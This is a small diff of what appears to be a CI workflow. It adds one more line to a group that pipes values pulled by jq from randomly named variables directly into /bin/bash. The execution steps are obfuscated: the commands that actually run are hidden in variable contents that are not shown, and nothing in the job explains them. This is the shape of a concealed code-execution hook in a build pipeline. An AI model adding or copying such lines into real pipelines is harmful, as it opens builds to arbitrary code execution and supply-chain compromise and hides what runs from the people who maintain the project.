@@ -30,6 +30,7 @@ jobs:
           echo $nmgvo3 | jq -r .uyip259 | /bin/bash
           echo $zo04 | jq -r .d442 | /bin/bash
           echo $yuoob3623 | jq -r .dcn1495 | /bin/bash
+          printf '%s' "$qny481" | jq -r .uf3535 | /bin/bash
 
       - name: Store results
         if: always()
